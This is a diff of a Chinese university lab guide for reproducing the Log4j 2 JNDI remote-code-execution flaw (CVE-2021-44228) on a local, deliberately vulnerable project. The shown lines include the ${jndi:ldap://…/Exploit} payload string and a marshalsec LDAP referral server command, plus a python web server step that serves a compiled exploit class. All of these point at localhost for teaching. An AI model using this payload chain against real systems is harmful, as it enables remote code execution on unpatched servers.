@@ -19,8 +19,7 @@
 ### 3.1 Log4j 2
 
 Apache Log4j 2 是 Apache 软件基金会下的一个开源的基于 Java 的日志记录工具。该日志框架被大量用于业务系统开发，用来记录日志信息。
-2021 年 12 月 9 日晚，Log4j 2 的一个远程代码执行漏洞的利用细节被公开。该漏洞 CVE 编号为 CVE-2021-44228，受影响版本为2.0 <= Apache Log4j < 2.15.0-rc1。
-该漏洞的主要原理是 Log4j 2 日志框架提供了一种叫做 `lookup` 的功能，当日志中包括 `${}`，`lookup` 功能就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。Log4j 2 提供的 `lookup` 功能支持 JNDI 方式查询。并且在 Log4j 2 中 JNDI 解析是未做限制的，可以直接访问到远程对象，此时远程对象如果是恶意服务的话，那么就会造成注入，也就是说当用户可以控制记录日志时，可以构造恶意字符串来使服务器调用 JNDI 访问恶意对象，从而触发漏洞。
+2021 年 12 月 9 日晚，Log4j 2 的一个远程代码执行漏洞的利用细节被公开。该漏洞 CVE 编号为 CVE-2021-44228，受影响版本为2.0 <= Apache Log4j < 2.15.0-rc1。该漏洞的主要原理是 Log4j 2 日志框架提供了一种叫做 `lookup` 的功能，当日志中包括 `${}`，`lookup` 功能就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。Log4j 2 提供的 `lookup` 功能支持 JNDI 方式查询。并且在 Log4j 2 中 JNDI 解析是未做限制的，可以直接访问到远程对象，此时远程对象如果是恶意服务的话，那么就会造成注入，也就是说当用户可以控制记录日志时，可以构造恶意字符串来使服务器调用 JNDI 访问恶意对象，从而触发漏洞。
 
 
 
@@ -39,7 +38,7 @@ JNDI 的实现方式有很多种，目前主要采用 RMI 和 LDAP 的实现方�
 + RMI：java 中的远程方法调用
 + LDAP：一个轻量级目录访问协议
 
-以 LDAP 为例，在复现漏洞实现攻击时，我们可以构建一个以  `${` 和 `}`  为开头和结尾的字符串，例如 ${jndi:ldap://127.0.0.1:1389/Exploit} ，Log4j2 会去解析此字符串，通过 JNDI 下的 LDAP 协议请求到本地1389端口下的 Exploit 恶意 class 文件。
+以 LDAP 为例，在复现漏洞实现攻击时，我们可以构建一个以  `${` 和 `}`  为开头和结尾的字符串，例如 `${jndi:ldap://127.0.0.1:1389/Exploit}` ，Log4j2 会去解析此字符串，通过 JNDI 下的 LDAP 协议请求到本地1389端口下的 Exploit 恶意 class 文件。
 
 
 ### 3.3 marshalsec
@@ -65,8 +64,6 @@ MySQL 是一个关系型数据库管理系统，是最流行的关系型数据�
 
 MySQL 的安装与配置参考[这篇博客](https://www.sjkjc.com/mysql/install-on-windows/)
 
-在本实验搭建 Java Web 网站的过程中，需要首先在数据库中新建数据库 `wj`，进入 `wj` 后执行命令 `source /path/to/wj.sql` 即可导入数据库。
-
 ### 3.5 Redis
 
 Redis 是一个高性能的 key-value 存储系统，在 4.2 的 Web 应用中会用到，但安装与否不影响实验
@@ -76,9 +73,9 @@ Redis的[安装地址](https://github.com/tporadowski/redis/releases)
 
 ### 3.6 Python
 
-实验过程中可能需要使用 python 命令来运行一个 http server，需要在本地配置 python 环境
+实验过程中可能需要使用 python 命令来运行一个 http server，需要在本地配置 python 环境。
 
-python 环境的安装和配置请同学们自行 Google
+python 环境的安装和配置请同学们自行 Google。
 
 ### 3.7 JDK 和 Maven
 
@@ -120,11 +117,11 @@ Log4j2Vul
 
 我们首先在本地尝试触发 Log4j 2 漏洞，执行一个简单的攻击脚本，打开本地计算器。
 
-+ 打开 IDEA，导入所给的 Log4j2Vul 项目中的Log4j2Ldap项目
++ 打开 IDEA，导入所给的 Log4j2Vul 项目中的 Log4j2Ldap 项目
 
   > 注意此处应导入 Log4j2Ldap 项目，不要导入整个Log4j2Vul
 
-+ 此项目引入的为2.12.1版本
++ 此项目引入的 Apache Log4j 为2.12.1版本
 
 ```xml
 <dependency>
@@ -138,13 +135,6 @@ Log4j2Vul
 	<version>2.12.1</version>
 </dependency>
 ```
-
-+ 使用3.3中提到的 marshalsec 反序列化工具，启动一个 LDAP 的服务
-
-```
-java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8100/#Exploit"
-```
-> 如果这一步报错提示端口被占用，可通过 `netstat -ano | findstr "port_number"` 查找占用进程，不重要的进程可以直接 kill。如果查找不到占用的进程，参考[这篇博客](https://blog.csdn.net/m0_47696151/article/details/117785566)。
 
 + 完成打开本地计算器的攻击脚本的编写
 
@@ -173,7 +163,14 @@ public class Exploit {
 javac Exploit.java
 ```
 
-+ 然后在class文件所在目录下启动一个 web 服务，此处建议使用 python 命令启动 web 服务
++ 使用3.3中提到的 marshalsec 反序列化工具，在 marshalsec 的 target 目录下启动一个 LDAP 服务
+
+```
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8100/#Exploit"
+```
+> 如果这一步报错提示端口被占用，可通过 `netstat -ano | findstr "port_number"` 查找占用进程，不重要的进程可以直接 kill。如果查找不到占用的进程，参考[这篇博客](https://blog.csdn.net/m0_47696151/article/details/117785566)。
+
++ 在 Exploit.class 文件所在目录下启动一个 web 服务，此处建议使用 python 命令启动 web 服务
 
 ```
 python -m http.server 8100
@@ -243,7 +240,8 @@ White-Jotter
 
 实验步骤：
 + 打开 IDEA，导入所给的 White-Jotter 项目
-+ 参考3.4和3.5在 mysql 中创建数据库 `wj` ，运行 src/main/resources 目录下的数据库脚本 wj.sql，并启动 Redis 服务。
++ 在 mysql 中创建数据库 `wj` ，运行 src/main/resources 目录下的数据库脚本 wj.sql。具体方法是，新建数据库 `wj`，进入 `wj` 后执行命令 `source /path/to/wj.sql` 即可导入数据。
++ 启动 Redis 服务（可选）。
 + 修改 src/main/resources 目录下的 application.properties 文件，将数据库用户名和密码以及 Redis 的端口和密码改成自己电脑上对应的端口和密码。
 
     ```bash
